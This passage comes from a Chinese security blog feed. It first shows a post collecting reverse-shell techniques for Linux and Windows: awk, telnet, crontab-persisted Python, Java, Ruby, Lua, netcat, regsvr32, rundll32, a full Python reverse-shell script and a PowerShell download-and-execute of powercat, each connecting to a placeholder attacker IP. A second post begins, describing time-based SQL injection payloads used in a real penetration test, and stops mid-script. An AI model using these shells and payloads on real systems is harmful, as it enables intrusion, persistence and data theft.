class="hljs-string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/攻击机ip/攻击机端口&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>效果</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924103720891.png" alt="image-20210924103720891" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924103830021.png" alt="image-20210924103830021" style="zoom:80%;"><h3 id="17telnet反弹"><a class="markdownIt-Anchor" href="#17telnet反弹"></a> 1.7.telnet反弹</h3><p>攻击机器命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br>nc -lvp 攻击机端口2<br>//在攻击机端口执行的命令会回显在攻击机端口2<br></code></pre></td></tr></table></figure><p>靶机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 攻击机ip 攻击机端口 | /bin/bash | telnet 攻击机ip 攻击机端口2<br></code></pre></td></tr></table></figure><p>效果</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924110120485.png" alt="image-20210924110120485" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924110205052.png" alt="image-20210924110205052" style="zoom:70%;"><h3 id="18crontab定时任务python反弹"><a class="markdownIt-Anchor" href="#18crontab定时任务python反弹"></a> 1.8.crontab定时任务+python反弹</h3><p>攻击机器命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure><p>靶机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(crontab -l;<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;* * * * *  /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;攻击机ip\&quot;,攻击机端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span>)|crontab -<br></code></pre></td></tr></table></figure><p>效果</p><p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924111618351.png" alt="image-20210924111618351"></p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924111653163.png" alt="image-20210924111653163" style="zoom:80%;"><h3 id="19java反弹shell"><a class="markdownIt-Anchor" href="#19java反弹shell"></a> 1.9.java反弹shell</h3><p><strong>可能需要先编译类文件，实际我操作直接使用java命令也可</strong></p><p>java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> args</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@throws</span> Exception </span><br><span class="hljs-comment">    */</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        Runtime r = Runtime.getRuntime();<br>        String cmd[]= &#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/攻击机ip/攻击机端口;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;<br>        Process p = r.exec(cmd);<br>        p.waitFor();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>靶机操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">touch 1.java<br>vim 1.java  //wq退出保存<br><span class="hljs-comment">##javac 1.java</span><br><span class="hljs-comment">##java 1</span><br><span class="hljs-comment">##或直接使用 java 1.java</span><br></code></pre></td></tr></table></figure><p>攻击机操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 攻击机端口<br></code></pre></td></tr></table></figure><p>效果：</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924141706817.png" alt="image-20210924141706817" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924142110086.png" alt="image-20210924142110086" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924142420044.png" alt="image-20210924142420044" style="zoom:80%;"><h3 id="110ruby反弹shell"><a class="markdownIt-Anchor" href="#110ruby反弹shell"></a> 1.10.Ruby反弹shell</h3><p>靶机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">&#x27;exit if fork;c=TCPSocket.new(&quot;攻击机ip&quot;,&quot;攻击机端口&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></code></pre></td></tr></table></figure><p>攻击机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 攻击机端口<br></code></pre></td></tr></table></figure><p>效果</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924142921750.png" alt="image-20210924142921750" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924143012492.png" alt="image-20210924143012492" style="zoom:80%;"><h3 id="111rua反弹shell未复现"><a class="markdownIt-Anchor" href="#111rua反弹shell未复现"></a> 1.11.rua反弹shell（未复现）</h3><p><strong>环境需要：</strong></p><p>1.lua命令安装</p><p>2.默认 FS 的 mod_lua 中没有对socket 的支持，想通过Lua 脚本实现 http，需要添加 socket的支持。</p><p>解决方法：<a href="https://www.cnblogs.com/logo-fox/p/5040908.html">luasocket 安装记录 （FS1.6） - 丹江流 - 博客园 (cnblogs.com)</a></p><p><strong>但是我无法下载那个 luasocket-2.0.2</strong></p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924144856249.png" alt="image-20210924144856249" style="zoom:80%;"><p>靶机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lua -e <span class="hljs-string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;攻击机ip&#x27;,&#x27;攻击机端口&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>攻击机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 攻击机端口<br></code></pre></td></tr></table></figure><h2 id="2windows反弹shell"><a class="markdownIt-Anchor" href="#2windows反弹shell"></a> 2.Windows反弹shell</h2><h3 id="21-nc反弹"><a class="markdownIt-Anchor" href="#21-nc反弹"></a> 2.1 nc反弹</h3><p><strong>需要把nc上传被控端，或者被控端自带nc</strong></p><p><strong>nc正向shell</strong>：</p><p>靶机命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 靶机端口 -e cmd.exe<br></code></pre></td></tr></table></figure><p>攻击机命令：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> 靶机<span class="hljs-built_in">ip</span> 靶机端口<br></code></pre></td></tr></table></figure><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924151035750.png" alt="image-20210924151035750" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924151207188.png" alt="image-20210924151207188" style="zoom:80%;"><p><strong>nc反向shell：</strong></p><p>靶机命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e cmd.exe 攻击机ip 攻击机端口<br></code></pre></td></tr></table></figure><p>攻击机命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 攻击机端口<br></code></pre></td></tr></table></figure><p>这里测试了powershell.exe</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924152312718.png" alt="image-20210924152312718" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924152246153.png" alt="image-20210924152246153" style="zoom:80%;"><h3 id="22-regsvr32-反弹shell没复现成功"><a class="markdownIt-Anchor" href="#22-regsvr32-反弹shell没复现成功"></a> <strong>2.2 Regsvr32 反弹shell</strong>（没复现成功）</h3><p><strong>介绍：</strong></p><p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。</p><p>Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p><p><strong>语法:</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Regsvr32 [<span class="hljs-string">/s</span>] [<span class="hljs-string">/u</span>] [<span class="hljs-string">/n</span>][<span class="hljs-string">/i</span>[<span class="hljs-function">:cmdline</span>]] &lt;dllname&gt;<br><span class="hljs-string">/u</span> - 注销服务器<br><span class="hljs-string">/i</span> - 调用DllInstall传递一个可选的[cmdline];当它与<span class="hljs-string">/u</span>一起使用时，它调用dll来卸载<br><span class="hljs-string">/n</span> - 不要调用DllRegisterServer; 此选项必须与<span class="hljs-string">/i</span>一起使用<br><span class="hljs-string">/s</span> - 沉默; 不显示消息框`<br></code></pre></td></tr></table></figure><p>使用:msf使用 web_delivery 模块</p><p>根据options进行设置</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924155945422.png" alt="image-20210924155945422" style="zoom:80%;"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/script/web_delivery<br>msf exploit (web_delivery)&gt; <span class="hljs-built_in">set</span> srvhost 攻击机ip<br>msf exploit (web_delivery)&gt; <span class="hljs-built_in">set</span> target 3<br>msf exploit (web_delivery)&gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br>msf exploit (web_delivery)&gt; <span class="hljs-built_in">set</span> lhost 攻击机ip<br>msf exploit (web_delivery)&gt; exploit -j<br></code></pre></td></tr></table></figure><p>随后生成一个命令</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924160240678.png" alt="image-20210924160240678" style="zoom:80%;"><p>在靶机上使用即可，命令形式**（会被杀软杀）**</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">regsvr32 /s /n /u /i:http://192.168.111.128:6666/nGauv3ccOg8WF.sct scrobj.dll<br></code></pre></td></tr></table></figure><p>测试执行成功，msf有回显，但是没拿到sessions？</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924160415706.png" alt="image-20210924160415706" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924160445451.png" alt="image-20210924160445451" style="zoom:80%;"><h3 id="22-rundll32命令反弹shell"><a class="markdownIt-Anchor" href="#22-rundll32命令反弹shell"></a> 2.2 rundll32命令反弹shell</h3><p>使用MyJSRat<br><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FRidter%2FMyJSRat">https://github.com/Ridter/MyJSRat</a></p><p>攻击机运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python MyJSRat.py -i  攻击机ip -p 攻击机端口<br></code></pre></td></tr></table></figure><p>靶机运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rundll32.exe javascript:<span class="hljs-string">&quot;\..\mshtml,RunHTMLApplication &quot;</span>;document.write();h=new%20ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);h.Open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://攻击机ip:攻击机端口/connect&quot;</span>,<span class="hljs-literal">false</span>);try&#123;h.Send();b=h.ResponseText;<span class="hljs-built_in">eval</span>(b);&#125;catch(e)&#123;new%20ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span>,0,<span class="hljs-literal">true</span>);&#125;<br></code></pre></td></tr></table></figure><p>效果：</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924161907221.png" alt="image-20210924161907221" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924161840713.png" alt="image-20210924161840713" style="zoom:80%;"><h3 id="23-python反弹shell"><a class="markdownIt-Anchor" href="#23-python反弹shell"></a> 2.3 python反弹shell</h3><p>python脚本代码（靶机运行）参考<a href="https://choge.top/2020/02/23/%E5%8F%8D%E5%BC%B9shell%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/">反弹shell脚本收集 | C0cho’s blog (choge.top)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> select<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ReserveConnect</span>(<span class="hljs-params">addr, port</span>):</span><br>    <span class="hljs-string">&#x27;&#x27;&#x27;shell&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        shell.connect((addr,port))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> reason:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;[-] Failed to Create Socket : %s&#x27;</span>%reason)<br>        exit(<span class="hljs-number">0</span>)<br>    rlist = [shell]<br>    wlist = []<br>    elist = [shell]<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        shell.send(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>        rs,ws,es = select.select(rlist,wlist,wlist)<br>        <span class="hljs-keyword">for</span> sockfd <span class="hljs-keyword">in</span> rs:<br>            <span class="hljs-keyword">if</span> sockfd == shell:<br>                command = shell.recv(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> command == <span class="hljs-string">&#x27;exit&#x27;</span>:<br>                    shell.close()<br>                    <span class="hljs-keyword">break</span><br>                result, error = subprocess.Popen(command,shell=<span class="hljs-literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()<br>                shell.sendall(result.decode(<span class="hljs-string">&quot;GB2312&quot;</span>).encode(<span class="hljs-string">&quot;UTF-8&quot;</span>))<br><br><span class="hljs-comment"># 主函数运行</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)&lt;<span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Usage: python reverse.py [IP] [PORT]&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        url = sys.argv[<span class="hljs-number">1</span>]<br>        port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])<br>        ReserveConnect(url,port)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run()<br></code></pre></td></tr></table></figure><p><strong>靶机运行</strong></p><p><strong>1.若没有python，可以封装成exe在靶机上运行</strong></p><p>封装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pythinstaller -Fw  脚本名.py<br></code></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xxx.exe 攻击机ip 攻击机端口<br></code></pre></td></tr></table></figure><p><strong>2.python直接运行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python 脚本名.py 攻击机ip 攻击机端口<br></code></pre></td></tr></table></figure><p><strong>攻击机运行nc即可</strong></p><p>攻击机命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 攻击机端口<br></code></pre></td></tr></table></figure><p>效果：</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924163150141.png" alt="image-20210924163150141" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924163220775.png" alt="image-20210924163220775" style="zoom:80%;"><h3 id="24-powershell反弹powershell使用powercat"><a class="markdownIt-Anchor" href="#24-powershell反弹powershell使用powercat"></a> 2.4 powershell反弹powershell（使用powercat）</h3><p>powercat github地址：<a href="https://github.com/besimorhino/powercat">besimorhino/powercat: netshell features all in version 2 powershell (github.com)</a></p><p>需要执行：Set-ExecutionPolicy RemoteSigned</p><p>设置包含可执行脚本</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924165941195.png" alt="image-20210924165941195" style="zoom:80%;"><p>靶机运行命令</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell IEX (New-Object System.Net.Webclient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">besimorhino</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span>.<span class="hljs-params">ps1</span>&#x27;)</span>; powercat -c 攻击机ip -p 攻击机端口 -e cmd<br></code></pre></td></tr></table></figure><p>攻击机nc监听即可</p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次实战渗透sql时间注入payload利用(select(0)from(select(sleep(6)))v)</title>
    <link href="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/"/>
    <url>/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/</url>
    
    <content type="html"><![CDATA[<h1 id="记一次实战sql时间注入payload利用select0fromselectsleep6v"><a class="markdownIt-Anchor" href="#记一次实战sql时间注入payload利用select0fromselectsleep6v"></a> 记一次实战sql时间注入payload利用(select(0)from(select(sleep(6)))v)</h1><h3 id="0x01-前言"><a class="markdownIt-Anchor" href="#0x01-前言"></a> 0x01 前言</h3><p>​某次渗透，又遇到了一个AWVS的payload是 <strong>(select(0)from(select(sleep(6)))v)/*’+(select(0)from(select(sleep(6)))v)+’&quot;+(select(0)from(select(sleep(6)))v)+&quot;*/</strong>，使用SQLmap还是不能直接跑出来，不过我确实还没见过这种时间盲注的payload。</p><img src="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/image-20210916160910664.png" alt="image-20210916160910664" style="zoom:67%;"><p>​百度一下发现这也是个时间盲注的payload，链接<a href="https://blog.csdn.net/qq_26317875/article/details/79949625">(3条消息) CVE-2015-3934 sql盲注payload_qq_26317875的博客-CSDN博客</a></p><p>不过我也很好奇为啥一定是3个 **(select(0)from(select(sleep(6)))v)**加上一堆过滤符号才能够注入.</p><p><img src="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/image-20210917201450604.png" alt="image-20210917201450604"></p><p>自己尝试了一下**/<em>’+(select(0)from(select(payload,sleep(5),0)))v)+’&quot;+(select(0)from(select(payload,sleep(5),0)))v)+&quot;</em>/** 和**’&quot;+(select(0)from(select(payload,sleep(5),0)))v)+&quot;*/**这样的payload，都不行，还是有点搞不懂。</p><img src="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/image-20210917213017578111.png" alt="image-20210917213017578" style="zoom: 80%;"><h3 id="0x02-payload"><a class="markdownIt-Anchor" href="#0x02-payload"></a> 0x02 payload</h3><p>​根据上文提到的文章，**(select(0)from(select(sleep(6)))v)**这样的payload可以解释为select嵌套查询，v为第二个select的别名，总结就是在第二个select子查询中时间盲注。</p><p>​使用方式就是使用时间盲注放入第二个子查询中的select当中即可，形式为**(select(0)from(select(payload,sleep(5),0)))v)**，利用sleep()进行时间盲注。</p><p>​测试了一下，如果要使用这个payload，需要3个select都修改，利用形式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(select(0)from(select(payload,sleep(5),0)))v)/<span class="hljs-string">&#x27;+(select(0)from(select(payload&#125;,sleep(5),0)))v)+&#x27;</span><span class="hljs-string">&quot;+(select(0)from(select(payload,sleep(5),0)))v)+&quot;</span>/<br></code></pre></td></tr></table></figure><p>成功进行利用：</p><p><img src="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/image-20210917214553352.png" alt="image-20210917214553352"></p><h3 id="0x03-python脚本完整版"><a class="markdownIt-Anchor" href="#0x03-python脚本完整版"></a> 0x03 python脚本（完整版）</h3><p>​修改自之前的脚本，全部函数写到一起，方便利用，优化了一些爆破的地方，也方便改为其他的payload，虽然没有利用二分减少判断时间，当时方便就好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 